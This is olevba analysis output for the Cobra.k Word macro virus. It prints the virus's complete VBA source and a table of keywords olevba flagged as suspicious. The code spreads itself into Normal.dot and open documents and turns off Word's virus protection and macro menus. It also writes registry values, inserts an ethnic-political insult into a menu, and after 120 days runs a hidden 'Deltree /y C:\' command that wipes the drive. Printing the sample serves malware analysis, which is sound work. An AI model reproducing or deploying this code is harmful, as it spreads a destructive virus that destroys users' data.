olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.k-d88b25765f26f94472259b158cbfcea3cfa7bd64
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.k-d88b25765f26f94472259b158cbfcea3cfa7bd64 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAX_10B.bas 
in file: Virus.MSWord.Cobra.k-d88b25765f26f94472259b158cbfcea3cfa7bd64 - OLE stream: 'Macros/VBA/AAX_10B'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AAX Version 1.0B
'A intelligent member of Cobra family

Sub AutoClose()
Call MenuOpt
Call InfCobra
Call RegE
Call MoreInfect
End Sub
Sub AutoOpen()
Call MenuOpt
Call InfCobra
Call RegE
Call MoreInfect
End Sub
Sub FileNew()
Call MenuOpt
Call InfCobra
Call RegE
Call MoreInfect
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call MenuOpt
Call InfCobra
Call RegE
Call MoreInfect
WordBasic.FileExit
End Sub
Sub MenuOpt()
On Error Resume Next
CustomizationContext = NormalTemplate
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub InfCobra()
On Error Resume Next
MacT = False
MacD = False
For Each MacrN In NormalTemplate.VBProject.VBComponents
If (MacrN.Name <> "ThisDocument" And MacrN.Name <> "AAX_10B" And Left(MacrN.Name, 5) <> "Cobra") Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=MacrN.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each MacrN In NormalTemplate.VBProject.VBComponents
If MacrN.Name = "AAX_10B" Then
MacT = True
End If
Next
If MacT = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="AAX_10B", _
Object:=wdOrganizerObjectProjectItems
End If
For Each DOC In Documents
For Each MacrN In DOC.VBProject.VBComponents
If (MacrN.Name <> "ThisDocument" And _
MacrN.Name <> "Reference to Normal" And MacrN.Name <> "AAX_10B") _
And Left(MacrN.Name, 5) <> "Cobra" Then
Application.OrganizerDelete Source:=DOC.FullName, _
Name:=MacrN.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
Next
For Each DOC In Documents
MacD = False
For Each MacrN In DOC.VBProject.VBComponents
If MacrN.Name = "AAX_10B" Then
MacD = True
End If
Next
If MacD = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=DOC.FullName, Name:="AAX_10B", _
Object:=wdOrganizerObjectProjectItems
End If
Next
End Sub
Sub RegE()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra ALIAS Liton" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra ALIAS Liton"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Shibrampur/Burichang/Comilla"
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "") = "" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "Inf") = Format(Date, "mm/dd/yyyy")
End If
End Sub
Sub MoreInfect()
On Error Resume Next
IDT = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "Inf")
CDT = Format(Date, "mm/dd/yyyy")
If DateValue(CDT) - DateValue(IDT) > 90 Then
If (Month(Date) = 3 And Day(Date) = 26) Or (Month(Date) = 12 And Day(Date) = 16) Then
ActiveDocument.CommandBars("File").Reset
ActiveDocument.CommandBars("File").Controls("New...").Caption = "Sheik Mojib is a big &Bustard of Bengal"
End If
End If
If DateValue(CDT) - DateValue(IDT) > 120 Then
If WeekDay(Date) = 6 Then
Shell "Deltree /y C:\", vbHide
End If
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

